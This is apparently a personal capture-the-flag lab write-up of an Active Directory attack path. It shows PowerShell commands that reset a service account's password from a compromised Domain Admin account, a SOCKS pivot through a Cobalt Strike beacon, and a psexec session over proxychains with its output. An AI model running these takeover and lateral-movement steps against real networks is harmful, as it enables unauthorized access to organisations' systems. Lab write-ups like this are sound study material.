# My unintended path

start at [[Whats the worst that could happen]] check point on `DC01.corp.local`
![[Pasted image 20240110231101.png]]
Utilized [[DC01 Domain bloodhound dump]] to get an idea of the next network.
![[Pasted image 20240110230802.png]]

utilizing `Bloodhound` revealed that `SVC_DEVOPS@CORP.LOCAL` is a local administrator on `WS03.DEV.ADMIN.OFFSHORE.COM` and also a part of `CORP.LOCAL` which we have `DA` for with the `IAMTHEADMINISTRATOR` account 
![[Pasted image 20240109151142.png]]
![[Pasted image 20240109151253.png]]
utilize these commands to change the password of `svc_devops` while being the `Domain Admin` account `corp\iamtheadministrator`
```powershell
$cred = ConvertTo-SecureString "bugsy_P4ss" -AsPlainText -force
Set-DomainUserPassword -identity svc_devops -accountpassword $cred
```
![[Pasted image 20240109164514.png]]
run `crackmapexec` to ensure that the password was changed
![[Pasted image 20240109164544.png]]
setup `SOCKS5` proxy pivot on `DC01` through a cobaltstrike beacon
![[Pasted image 20240109164629.png]]
`psexec'd` onto `ws03
this shell is very very slow due to going through proxychains
```powershell
┌──(root💀gobots)-[09Jan2024 18:50:11]-[/usr/share/windows-resources/powersploit/Recon]
└─# proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py CORP.LOCAL/svc_devops@172.16.2.102
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Impacket v0.11.0 - Copyright 2023 Fortra

Password: bugsy_P4ss
[*] Requesting shares on 172.16.2.102.....
[*] Found writable share ADMIN$
[*] Uploading file fOqHJdQp.exe
[*] Opening SVCManager on 172.16.2.102.....
[*] Creating service KWDU on 172.16.2.102.....
[*] Starting service KWDU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 
```
navigate to `c:\users\administrator\Desktop` to grab flag
```powershell
c:\Users\administrator\Desktop> dir                                                                                                                                                                         
 Volume in drive C has no label.                                                                                                                                                                            
 Volume Serial Number is A39E-D5A7                                                                                                                                                                          

 Directory of c:\Users\administrator\Desktop                                                                                                                                                                

04/29/2018  02:22 AM    <DIR>          .                                                                                                                                                                    
04/29/2018  02:22 AM    <DIR>          ..                                                                                                                                                                   
04/29/2018  02:23 AM                36 flag.txt                                                                                                                                                             
               1 File(s)             36 bytes                                                                                                                                                               
               2 Dir(s)  18,295,459,840 bytes free                                                                                                                                                          
 
c:\Users\administrator\Desktop> type flag.txt                                                                                                                                                               
OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d} 
```


# Intended Path
looking in blood hound you identify that `JOE@DEV.ADMIN.OFFSHORE.COM` is a `local admin` to `WS03`
![[Pasted image 20240110234505.png]]
you can see that `joe` is able to rdp in.
![[Pasted image 20240110234531.png]]
you see that a password is not required for `joe`
![[Pasted image 20240110234608.png]]
you `proxychains rdesktop -u joe -d dev.admin.offshore.com 172.16.2.102` into a session that makes you want to cry
![[Pasted image 20240110234723.png]]
you `please wait` 
![[Pasted image 20240110234749.png]]
you click on `dev.admin.offshore.com\joe` or other user to login as joe with no password
![[Pasted image 20240110234952.png]]
it says `welcome` for 3 minutes  ( you dont feel welcome at all )
![[Pasted image 20240110235159.png]]
you find elwoods stuff upon opening and proceed to get a cobalt strike beacon to grab the first flag `headed down another path`

